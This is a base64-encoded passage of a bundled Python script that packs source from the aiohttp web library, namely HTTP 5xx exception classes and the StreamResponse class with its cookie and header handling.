ImJsb2NrZWQtYnkiXCcgJSBsaW5rXHJcbiAgICAgICAgc2VsZi5saW5rID0gbGlua1xyXG5cclxuXHJcbiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xyXG4jIDV4eCBTZXJ2ZXIgRXJyb3JcclxuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXHJcbiMgIFJlc3BvbnNlIHN0YXR1cyBjb2RlcyBiZWdpbm5pbmcgd2l0aCB0aGUgZGlnaXQgIjUiIGluZGljYXRlIGNhc2VzIGluXHJcbiMgIHdoaWNoIHRoZSBzZXJ2ZXIgaXMgYXdhcmUgdGhhdCBpdCBoYXMgZXJyZWQgb3IgaXMgaW5jYXBhYmxlIG9mXHJcbiMgIHBlcmZvcm1pbmcgdGhlIHJlcXVlc3QuIEV4Y2VwdCB3aGVuIHJlc3BvbmRpbmcgdG8gYSBIRUFEIHJlcXVlc3QsIHRoZVxyXG4jICBzZXJ2ZXIgU0hPVUxEIGluY2x1ZGUgYW4gZW50aXR5IGNvbnRhaW5pbmcgYW4gZXhwbGFuYXRpb24gb2YgdGhlIGVycm9yXHJcbiMgIHNpdHVhdGlvbiwgYW5kIHdoZXRoZXIgaXQgaXMgYSB0ZW1wb3Jhcnkgb3IgcGVybWFuZW50IGNvbmRpdGlvbi4gVXNlclxyXG4jICBhZ2VudHMgU0hPVUxEIGRpc3BsYXkgYW55IGluY2x1ZGVkIGVudGl0eSB0byB0aGUgdXNlci4gVGhlc2UgcmVzcG9uc2VcclxuIyAgY29kZXMgYXJlIGFwcGxpY2FibGUgdG8gYW55IHJlcXVlc3QgbWV0aG9kLlxyXG5cclxuXHJcbmNsYXNzIEhUVFBTZXJ2ZXJFcnJvcihIVFRQRXJyb3IpOlxyXG4gICAgcGFzc1xyXG5cclxuXHJcbmNsYXNzIEhUVFBJbnRlcm5hbFNlcnZlckVycm9yKEhUVFBTZXJ2ZXJFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDUwMFxyXG5cclxuXHJcbmNsYXNzIEhUVFBOb3RJbXBsZW1lbnRlZChIVFRQU2VydmVyRXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA1MDFcclxuXHJcblxyXG5jbGFzcyBIVFRQQmFkR2F0ZXdheShIVFRQU2VydmVyRXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA1MDJcclxuXHJcblxyXG5jbGFzcyBIVFRQU2VydmljZVVuYXZhaWxhYmxlKEhUVFBTZXJ2ZXJFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDUwM1xyXG5cclxuXHJcbmNsYXNzIEhUVFBHYXRld2F5VGltZW91dChIVFRQU2VydmVyRXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA1MDRcclxuXHJcblxyXG5jbGFzcyBIVFRQVmVyc2lvbk5vdFN1cHBvcnRlZChIVFRQU2VydmVyRXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA1MDVcclxuXHJcblxyXG5jbGFzcyBIVFRQVmFyaWFudEFsc29OZWdvdGlhdGVzKEhUVFBTZXJ2ZXJFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDUwNlxyXG5cclxuXHJcbmNsYXNzIEhUVFBJbnN1ZmZpY2llbnRTdG9yYWdlKEhUVFBTZXJ2ZXJFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDUwN1xyXG5cclxuXHJcbmNsYXNzIEhUVFBOb3RFeHRlbmRlZChIVFRQU2VydmVyRXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA1MTBcclxuXHJcblxyXG5jbGFzcyBIVFRQTmV0d29ya0F1dGhlbnRpY2F0aW9uUmVxdWlyZWQoSFRUUFNlcnZlckVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNTExXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL3dlYl9yZXNwb25zZS5weScsIGInaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IGNvbGxlY3Rpb25zLmFiY1xyXG5pbXBvcnQgZGF0ZXRpbWVcclxuaW1wb3J0IGVudW1cclxuaW1wb3J0IGpzb25cclxuaW1wb3J0IG1hdGhcclxuaW1wb3J0IHRpbWVcclxuaW1wb3J0IHdhcm5pbmdzXHJcbmltcG9ydCB6bGliXHJcbmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBFeGVjdXRvclxyXG5mcm9tIGh0dHAuY29va2llcyBpbXBvcnQgTW9yc2VsLCBTaW1wbGVDb29raWVcclxuZnJvbSB0eXBpbmcgaW1wb3J0IChcclxuICAgIFRZUEVfQ0hFQ0tJTkcsXHJcbiAgICBBbnksXHJcbiAgICBEaWN0LFxyXG4gICAgSXRlcmF0b3IsXHJcbiAgICBNYXBwaW5nLFxyXG4gICAgTXV0YWJsZU1hcHBpbmcsXHJcbiAgICBPcHRpb25hbCxcclxuICAgIFR1cGxlLFxyXG4gICAgVW5pb24sXHJcbiAgICBjYXN0LFxyXG4pXHJcblxyXG5mcm9tIG11bHRpZGljdCBpbXBvcnQgQ0lNdWx0aURpY3QsIGlzdHJcclxuXHJcbmZyb20gLiBpbXBvcnQgaGRycywgcGF5bG9hZFxyXG5mcm9tIC5hYmMgaW1wb3J0IEFic3RyYWN0U3RyZWFtV3JpdGVyXHJcbmZyb20gLmhlbHBlcnMgaW1wb3J0IChcclxuICAgIEVUQUdfQU5ZLFxyXG4gICAgUFlfMzgsXHJcbiAgICBRVU9URURfRVRBR19SRSxcclxuICAgIEVUYWcsXHJcbiAgICBIZWFkZXJzTWl4aW4sXHJcbiAgICBwYXJzZV9odHRwX2RhdGUsXHJcbiAgICByZmM4MjJfZm9ybWF0dGVkX3RpbWUsXHJcbiAgICBzZW50aW5lbCxcclxuICAgIHZhbGlkYXRlX2V0YWdfdmFsdWUsXHJcbilcclxuZnJvbSAuaHR0cCBpbXBvcnQgUkVTUE9OU0VTLCBTRVJWRVJfU09GVFdBUkUsIEh0dHBWZXJzaW9uMTAsIEh0dHBWZXJzaW9uMTFcclxuZnJvbSAucGF5bG9hZCBpbXBvcnQgUGF5bG9hZFxyXG5mcm9tIC50eXBlZGVmcyBpbXBvcnQgSlNPTkVuY29kZXIsIExvb3NlSGVhZGVyc1xyXG5cclxuX19hbGxfXyA9ICgiQ29udGVudENvZGluZyIsICJTdHJlYW1SZXNwb25zZSIsICJSZXNwb25zZSIsICJqc29uX3Jlc3BvbnNlIilcclxuXHJcblxyXG5pZiBUWVBFX0NIRUNLSU5HOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBmcm9tIC53ZWJfcmVxdWVzdCBpbXBvcnQgQmFzZVJlcXVlc3RcclxuXHJcbiAgICBCYXNlQ2xhc3MgPSBNdXRhYmxlTWFwcGluZ1tzdHIsIEFueV1cclxuZWxzZTpcclxuICAgIEJhc2VDbGFzcyA9IGNvbGxlY3Rpb25zLmFiYy5NdXRhYmxlTWFwcGluZ1xyXG5cclxuXHJcbmlmIG5vdCBQWV8zODpcclxuICAgICMgYWxsb3cgc2FtZXNpdGUgdG8gYmUgdXNlZCBpbiBweXRob24gPCAzLjhcclxuICAgICMgYWxyZWFkeSBwZXJtaXR0ZWQgaW4gcHl0aG9uIDMuOCwgc2VlIGh0dHBzOi8vYnVncy5weXRob24ub3JnL2lzc3VlMjk2MTNcclxuICAgIE1vcnNlbC5fcmVzZXJ2ZWRbInNhbWVzaXRlIl0gPSAiU2FtZVNpdGUiICAjIHR5cGU6IGlnbm9yZVthdHRyLWRlZmluZWRdXHJcblxyXG5cclxuY2xhc3MgQ29udGVudENvZGluZyhlbnVtLkVudW0pOlxyXG4gICAgIyBUaGUgY29udGVudCBjb2RpbmdzIHRoYXQgd2UgaGF2ZSBzdXBwb3J0IGZvci5cclxuICAgICNcclxuICAgICMgQWRkaXRpb25hbCByZWdpc3RlcmVkIGNvZGluZ3MgYXJlIGxpc3RlZCBhdDpcclxuICAgICMgaHR0cHM6Ly93d3cuaWFuYS5vcmcvYXNzaWdubWVudHMvaHR0cC1wYXJhbWV0ZXJzL2h0dHAtcGFyYW1ldGVycy54aHRtbCNjb250ZW50LWNvZGluZ1xyXG4gICAgZGVmbGF0ZSA9ICJkZWZsYXRlIlxyXG4gICAgZ3ppcCA9ICJnemlwIlxyXG4gICAgaWRlbnRpdHkgPSAiaWRlbnRpdHkiXHJcblxyXG5cclxuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXHJcbiMgSFRUUCBSZXNwb25zZSBjbGFzc2VzXHJcbiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xyXG5cclxuXHJcbmNsYXNzIFN0cmVhbVJlc3BvbnNlKEJhc2VDbGFzcywgSGVhZGVyc01peGluKTpcclxuXHJcbiAgICBfbGVuZ3RoX2NoZWNrID0gVHJ1ZVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgc3RhdHVzOiBpbnQgPSAyMDAsXHJcbiAgICAgICAgcmVhc29uOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBoZWFkZXJzOiBPcHRpb25hbFtMb29zZUhlYWRlcnNdID0gTm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9ib2R5ID0gTm9uZVxyXG4gICAgICAgIHNlbGYuX2tlZXBfYWxpdmUgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2Jvb2xdXHJcbiAgICAgICAgc2VsZi5fY2h1bmtlZCA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fY29tcHJlc3Npb24gPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzaW9uX2ZvcmNlID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtDb250ZW50Q29kaW5nXVxyXG4gICAgICAgIHNlbGYuX2Nvb2tpZXMgPSBTaW1wbGVDb29raWUoKSAgIyB0eXBlOiBTaW1wbGVDb29raWVbc3RyXVxyXG5cclxuICAgICAgICBzZWxmLl9yZXEgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW0Jhc2VSZXF1ZXN0XVxyXG4gICAgICAgIHNlbGYuX3BheWxvYWRfd3JpdGVyID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtBYnN0cmFjdFN0cmVhbVdyaXRlcl1cclxuICAgICAgICBzZWxmLl9lb2Zfc2VudCA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fYm9keV9sZW5ndGggPSAwXHJcbiAgICAgICAgc2VsZi5fc3RhdGUgPSB7fSAgIyB0eXBlOiBEaWN0W3N0ciwgQW55XVxyXG5cclxuICAgICAgICBpZiBoZWFkZXJzIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9oZWFkZXJzID0gQ0lNdWx0aURpY3QoaGVhZGVycykgICMgdHlwZTogQ0lNdWx0aURpY3Rbc3RyXVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYuX2hlYWRlcnMgPSBDSU11bHRpRGljdCgpXHJcblxyXG4gICAgICAgIHNlbGYuc2V0X3N0YXR1cyhzdGF0dXMsIHJlYXNvbilcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBwcmVwYXJlZChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wYXlsb2FkX3dyaXRlciBpcyBub3QgTm9uZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHRhc2soc2VsZikgLT4gIk9wdGlvbmFsW2FzeW5jaW8uVGFza1tOb25lXV0iOlxyXG4gICAgICAgIGlmIHNlbGYuX3JlcTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX3JlcS50YXNrXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBzdGF0dXMoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9zdGF0dXNcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjaHVua2VkKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2NodW5rZWRcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjb21wcmVzc2lvbihzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jb21wcmVzc2lvblxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHJlYXNvbihzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlYXNvblxyXG5cclxuICAgIGRlZiBzZXRfc3RhdHVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgc3RhdHVzOiBpbnQsXHJcbiAgICAgICAgcmVhc29uOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBfUkVTUE9OU0VTOiBNYXBwaW5nW2ludCwgVHVwbGVbc3RyLCBzdHJdXSA9IFJFU1BPTlNFUyxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBhc3NlcnQgbm90IHNlbGYucHJlcGFyZWQsIChcclxuICAgICAgICAgICAgIkNhbm5vdCBjaGFuZ2UgdGhlIHJlc3BvbnNlIHN0YXR1cyBjb2RlIGFmdGVyICIgInRoZSBoZWFkZXJzIGhhdmUgYmVlbiBzZW50IlxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9zdGF0dXMgPSBpbnQoc3RhdHVzKVxyXG4gICAgICAgIGlmIHJlYXNvbiBpcyBOb25lOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICByZWFzb24gPSBfUkVTUE9OU0VTW3NlbGYuX3N0YXR1c11bMF1cclxuICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjpcclxuICAgICAgICAgICAgICAgIHJlYXNvbiA9ICIiXHJcbiAgICAgICAgc2VsZi5fcmVhc29uID0gcmVhc29uXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYga2VlcF9hbGl2ZShzZWxmKSAtPiBPcHRpb25hbFtib29sXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fa2VlcF9hbGl2ZVxyXG5cclxuICAgIGRlZiBmb3JjZV9jbG9zZShzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2tlZXBfYWxpdmUgPSBGYWxzZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGJvZHlfbGVuZ3RoKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fYm9keV9sZW5ndGhcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBvdXRwdXRfbGVuZ3RoKHNlbGYpIC0+IGludDpcclxuICAgICAgICB3YXJuaW5ncy53YXJuKCJvdXRwdXRfbGVuZ3RoIGlzIGRlcHJlY2F0ZWQiLCBEZXByZWNhdGlvbldhcm5pbmcpXHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX3BheWxvYWRfd3JpdGVyXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3BheWxvYWRfd3JpdGVyLmJ1ZmZlcl9zaXplXHJcblxyXG4gICAgZGVmIGVuYWJsZV9jaHVua2VkX2VuY29kaW5nKHNlbGYsIGNodW5rX3NpemU6IE9wdGlvbmFsW2ludF0gPSBOb25lKSAtPiBOb25lOlxyXG4gICAgICAgICIiIkVuYWJsZXMgYXV0b21hdGljIGNodW5rZWQgdHJhbnNmZXIgZW5jb2RpbmcuIiIiXHJcbiAgICAgICAgc2VsZi5fY2h1bmtlZCA9IFRydWVcclxuXHJcbiAgICAgICAgaWYgaGRycy5DT05URU5UX0xFTkdUSCBpbiBzZWxmLl9oZWFkZXJzOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiWW91IGNhblwndCBlbmFibGUgY2h1bmtlZCBlbmNvZGluZyB3aGVuICIgImEgY29udGVudCBsZW5ndGggaXMgc2V0IlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgaWYgY2h1bmtfc2l6ZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybigiQ2h1bmsgc2l6ZSBpcyBkZXByZWNhdGVkICMxNjE1IiwgRGVwcmVjYXRpb25XYXJuaW5nKVxyXG5cclxuICAgIGRlZiBlbmFibGVfY29tcHJlc3Npb24oXHJcbiAgICAgICAgc2VsZiwgZm9yY2U6IE9wdGlvbmFsW1VuaW9uW2Jvb2wsIENvbnRlbnRDb2RpbmddXSA9IE5vbmVcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJFbmFibGVzIHJlc3BvbnNlIGNvbXByZXNzaW9uIGVuY29kaW5nLiIiIlxyXG4gICAgICAgICMgQmFja3dhcmRzIGNvbXBhdGliaWxpdHkgZm9yIHdoZW4gZm9yY2Ugd2FzIGEgYm9vbCA8MC4xNy5cclxuICAgICAgICBpZiB0eXBlKGZvcmNlKSA9PSBib29sOlxyXG4gICAgICAgICAgICBmb3JjZSA9IENvbnRlbnRDb2RpbmcuZGVmbGF0ZSBpZiBmb3JjZSBlbHNlIENvbnRlbnRDb2RpbmcuaWRlbnRpdHlcclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICJVc2luZyBib29sZWFuIGZvciBmb3JjZSBpcyBkZXByZWNhdGVkICMzMzE4IiwgRGVwcmVjYXRpb25XYXJuaW5nXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBlbGlmIGZvcmNlIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBhc3NlcnQgaXNpbnN0YW5jZShmb3JjZSwgQ29udGVudENvZGluZyksIChcclxuICAgICAgICAgICAgICAgICJmb3JjZSBzaG91bGQgb25lIG9mICIgIk5vbmUsIGJvb2wgb3IgIiAiQ29udGVudEVuY29kaW5nIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzaW9uID0gVHJ1ZVxyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzaW9uX2ZvcmNlID0gZm9yY2VcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBoZWFkZXJzKHNlbGYpIC0+ICJDSU11bHRpRGljdFtzdHJdIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5faGVhZGVyc1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNvb2tpZXMoc2VsZikgLT4gIlNpbXBsZUNvb2tpZVtzdHJdIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY29va2llc1xyXG5cclxuICAgIGRlZiBzZXRfY29va2llKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbmFtZTogc3RyLFxyXG4gICAgICAgIHZhbHVlOiBzdHIsXHJcbiAgICAgICAgKixcclxuICAgICAgICBleHBpcmVzOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBkb21haW46IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIG1heF9hZ2U6IE9wdGlvbmFsW1VuaW9uW2ludCwgc3RyXV0gPSBOb25lLFxyXG4gICAgICAgIHBhdGg6IHN0ciA9ICIvIixcclxuICAgICAgICBzZWN1cmU6IE9wdGlvbmFsW2Jvb2xdID0gTm9uZSxcclxuICAgICAgICBodHRwb25seTogT3B0aW9uYWxbYm9vbF0gPSBOb25lLFxyXG4gICAgICAgIHZlcnNpb246IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIHNhbWVzaXRlOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJTZXQgb3IgdXBkYXRlIHJlc3BvbnNlIGNvb2tpZS5cclxuXHJcbiAgICAgICAgU2V0cyBuZXcgY29va2llIG9yIHVwZGF0ZXMgZXhpc3RlbnQgd2l0aCBuZXcgdmFsdWUuXHJcbiAgICAgICAgQWxzbyB1cGRhdGVzIG9ubHkgdGhvc2UgcGFyYW1zIHdoaWNoIGFyZSBub3QgTm9uZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICBvbGQgPSBzZWxmLl9jb29raWVzLmdldChuYW1lKVxyXG4gICAgICAgIGlmIG9sZCBpcyBub3QgTm9uZSBhbmQgb2xkLmNvZGVkX3ZhbHVlID09ICIiOlxyXG4gICAgICAgICAgICAjIGRlbGV0ZWQgY29va2llXHJcbiAgICAgICAgICAgIHNlbGYuX2Nvb2tpZXMucG9wKG5hbWUsIE5vbmUpXHJcblxyXG4gICAgICAgIHNlbGYuX2Nvb2tpZXNbbmFtZV0gPSB2YWx1ZVxyXG4gICAgICAgIGMgPSBzZWxmLl9jb29raWVzW25hbWVdXHJcblxyXG4gICAgICAgIGlmIGV4cGlyZXMgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGNbImV4cGlyZXMiXSA9IGV4cGlyZXNcclxuICAgICAgICBlbGlmIGMuZ2V0KCJleHBpcmVzIikgPT0gIlRodSwgMDEgSmFuIDE5NzAgMDA6MDA6MDAgR01UIjpcclxuICAgICAgICAgICAgZGVsIGNbImV4cGlyZXMiXVxyXG5cclxuICAgICAgICBpZiBkb21haW4gaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGNbImRvbWFpbiJdID0gZG9tYWluXHJcblxyXG4gICAgICAgIGlmIG1heF9hZ2UgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGNbIm1heC1hZ2UiXSA9IHN0cihtYXhfYWdlKVxyXG4gICAgICAgIGVsaWYgIm1heC1hZ2UiIGluIGM6XHJcbiAgICAgICAgICAgIGRlbCBjWyJtYXgtYWdlIl1cclxuXHJcbiAgICAgICAgY1sicGF0aCJdID0gcGF0aFxyXG5cclxuICAgICAgICBpZiBzZWN1cmUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGNbInNlY3VyZSJdID0gc2VjdXJlXHJcbiAgICAgICAgaWYgaHR0cG9ubHkgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGNbImh0dHBvbmx5Il0gPSBodHRwb25seVxyXG4gICAgICAgIGlmIHZlcnNpb24gaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGNbInZlcnNpb24iXSA9IHZlcnNpb25cclxuICAgICAgICBpZiBzYW1lc2l0ZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgY1sic2FtZXNpdGUiXSA9IHNhbWVzaXRlXHJcblxyXG4gICAgZGVmIGRlbF9jb29raWUoXHJcbiAgICAgICAgc2VsZiwgbmFtZTogc3RyLCAqLCBkb21haW46IE9wdGlvbmFsW3N0cl0gPSBOb25lLCBwYXRoOiBzdHIgPSAiLyJcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJEZWxldGUgY29va2llLlxyXG5cclxuICAgICAgICBDcmVhdGVzIG5ldyBlbXB0eSBleHBpcmVkIGNvb2tpZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICAjIFRPRE86IGRvIHdlIG5lZWQgZG9tYWluL3BhdGggaGVyZT9cclxuICAgICAgICBzZWxmLl9jb29raWVzLnBvcChuYW1lLCBOb25lKVxyXG4gICAgICAgIHNlbGYuc2V0X2Nvb2tpZShcclxuICAgICAgICAgICAgbmFtZSxcclxuICAgICAgICAgICAgIiIsXHJcbiAgICAgICAgICAgIG1heF9hZ2U9MCxcclxuICAgICAgICAgICAgZXhwaXJlcz0iVGh1LCAwMSBKYW4gMTk3MCAwMDowMDowMCBHTVQiLFxyXG4gICAgICAgICAgICBkb21haW49ZG9tYWluLFxyXG4gICAgICAgICAgICBwYXRoPXBhdGgsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNvbnRlbnRfbGVuZ3RoKHNlbGYpIC0+IE9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgIyBKdXN0IGEgcGxhY2Vob2xkZXIgZm9yIGFkZGluZyBzZXR0ZXJcclxuICAgICAgICByZXR1cm4gc3VwZXIoKS5jb250ZW50X2xlbmd0aFxyXG5cclxuICAgIEBjb250ZW50X2xlbmd0aC5zZXR0ZXJcclxuICAgIGRlZiBjb250ZW50X2xlbmd0aChzZWxmLCB2YWx1ZTogT3B0aW9uYWxbaW50XSkgLT4gTm9uZTpcclxuICAgICAgICBpZiB2YWx1ZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgdmFsdWUgPSBpbnQodmFsdWUpXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2NodW5rZWQ6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgIllvdSBjYW5cJ3Qgc2V0IGNvbnRlbnQgbGVuZ3RoIHdoZW4gIiAiY2h1bmtlZCBlbmNvZGluZyBpcyBlbmFibGUiXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHNlbGYuX2hlYWRlcnNbaGRycy5DT05URU5UX0xFTkdUSF0gPSBzdHIodmFsdWUpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5faGVhZGVycy5wb3AoaGRycy5DT05URU5UX0xFTkdUSCwgTm9uZSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjb250ZW50X3R5cGUoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgICMgSnVzdCBhIHBsYWNlaG9sZGVyIGZvciBhZGRpbmcgc2V0dGVyXHJcbiAgICAgICAgcmV0dXJuIHN1cGVyKCkuY29udGVudF90eXBlXHJcblxyXG4gICAgQGNvbnRlbnRfdHlwZS5zZXR0ZXJcclxuICAgIGRlZiBjb250ZW50X3R5cGUoc2VsZiwgdmFsdWU6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbnRlbnRfdHlwZSAgIyByZWFkIGhlYWRlciB2YWx1ZXMgaWYgbmVlZGVkXHJcbiAgICAgICAgc2VsZi5fY29udGVudF90eXBlID0gc3RyKHZhbHVlKVxyXG4gICAgICAgIHNlbGYuX2dlbmVyYXRlX2NvbnRlbnRfdHlwZV9oZWFkZXIoKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNoYXJzZXQoc2VsZikgLT4gT3B0aW9uYWxbc3RyXTpcclxuICAgICAgICAjIEp1c3QgYSBwbGFjZWhvbGRlciBmb3IgYWRkaW5nIHNldHRlclxyXG4gICAgICAgIHJldHVybiBzdXBlcigpLmNoYXJzZXRcclxuXHJcbiAgICBAY2hhcnNldC5zZXR0ZXJcclxuICAgIGRlZiBjaGFyc2V0KHNlbGYsIHZhbHVlOiBPcHRpb25hbFtzdHJdKSAtPiBOb25lOlxyXG4gICAgICAgIGN0eXBlID0gc2VsZi5jb250ZW50X3R5cGUgICMgcmVhZCBoZWFkZXIgdmFsdWVzIGlmIG5lZWRlZFxyXG4gICAgICAgIGlmIGN0eXBlID09ICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiU2V0dGluZyBjaGFyc2V0IGZvciBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0gIlxyXG4gICAgICAgICAgICAgICAgImRvZXNuXCd0IG1ha2Ugc2Vuc2UsIHNldHVwIGNvbnRlbnRfdHlwZSBmaXJzdCJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGFzc2VydCBzZWxmLl9jb250ZW50X2RpY3QgaXMgbm90IE5vbmVcclxuICAgICAgICBpZiB2YWx1ZSBpcyBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9jb250ZW50X2RpY3QucG9wKCJjaGFyc2V0IiwgTm9uZSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLl9jb250ZW50X2RpY3RbImNoYXJzZXQiXSA9IHN0cih2YWx1ZSkubG93ZXIoKVxyXG4gICAgICAgIHNlbGYuX2dlbmVyYXRlX2NvbnRlbnRfdHlwZV9oZWFkZXIoKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGxhc3RfbW9kaWZpZWQoc2VsZikgLT4gT3B0aW9uYWxbZGF0ZXRpbWUuZGF0ZXRpbWVdOlxyXG4gICAgICAgICIiIlRoZSB2YWx1ZSBvZiBMYXN0LU1vZGlmaWVkIEhUVFAgaGVhZGVyLCBvciBOb25lLlxyXG5cclxuICAgICAgICBUaGlzIGhlYWRlciBpcyByZXByZXNlbnRlZCBhcyBhIGBkYXRldGltZWAgb2JqZWN0LlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBwYXJzZV9odHRwX2RhdGUoc2VsZi5faGVhZGVycy5nZXQoaGRycy5MQVNUX01PR